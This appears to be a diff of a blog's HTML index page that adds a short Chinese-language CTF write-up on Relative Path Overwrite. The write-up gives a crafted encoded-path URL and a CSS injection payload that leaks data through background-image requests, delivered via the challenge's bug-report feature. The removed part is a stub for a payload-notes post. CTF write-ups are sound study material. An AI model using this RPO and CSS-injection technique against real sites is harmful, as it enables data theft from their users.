@@ -50,6 +50,48 @@
     <header>
       
         <div class="icon"></div>
+        <time datetime="2017-03-26T14:33:21.000Z"><a href="/2017/03/26/pwnhub-writeup/">2017-03-26</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2017/03/26/pwnhub-writeup/">pwnhub writeup</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="pwnhub-wp-大物必须过"><a href="#pwnhub-wp-大物必须过" class="headerlink" title="pwnhub wp 大物必须过"></a>pwnhub wp 大物必须过</h1><p>刚看的<strong>RPO (Relative Path Overwrite) 相对路径覆盖</strong>就被人用来出题了蛮放上来凑个数</p>
+<p><a href="http://blog.innerht.ml/rpo-gadgets/" target="_blank" rel="external">http://blog.innerht.ml/rpo-gadgets/</a></p>
+<p>原理大概就是利用浏览器和服务器对url编码的解析方式不同当我们访问<code>http://domain/1%2f2.php</code>时服务器会返回<code>http://domain/1/2.php</code>的内容而浏览器则会认为<code>1%2f2.php</code>为一个文件</p>
+<p>在这题的<code>52.80.19.55/classes.php</code>下是这样引入css的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"../../classes.css"</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>如果我们访问<code>http://52.80.19.55/user.php/341/a/b/..%2f..%2f..%2f..%2fclasses.php</code></p>
+<p>服务器返回的是<code>http://52.80.19.55/classes.php</code></p>
+<p>而浏览器认为<code>..%2f..%2f..%2f..%2fclasses.php</code>是一个文件则引入的css是</p>
+<p><code>http://52.80.19.55/user.php/341/classes.css</code>即<code>http://52.80.19.55/user.php/341</code></p>
+<p>我们只要注册时在Your study vow里写上我们要执行的css<code>{}*{background-image:url(url)}</code>然后把上面的url通过bug report发出去之后收到的头里就有flag了<del>忘记截图了</del></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
         <time datetime="2017-03-26T14:29:23.000Z"><a href="/2017/03/26/ssrf/">2017-03-26</a></time>
       
       
@@ -88,43 +130,6 @@
     </div>
     <footer>
       
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2017-03-22T15:14:48.000Z"><a href="/2017/03/22/Some-Notes/">2017-03-22</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2017/03/22/Some-Notes/">笔记</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><hr>
-<p>一些会用到的payload收集起来避免临时去找不定期更新</p>
-      
-    </div>
-    <footer>
-      
-        
-          <div class="alignleft">
-            <a href="/2017/03/22/Some-Notes/#more" class="more-link">Read More</a>
-          </div>
         
         
       
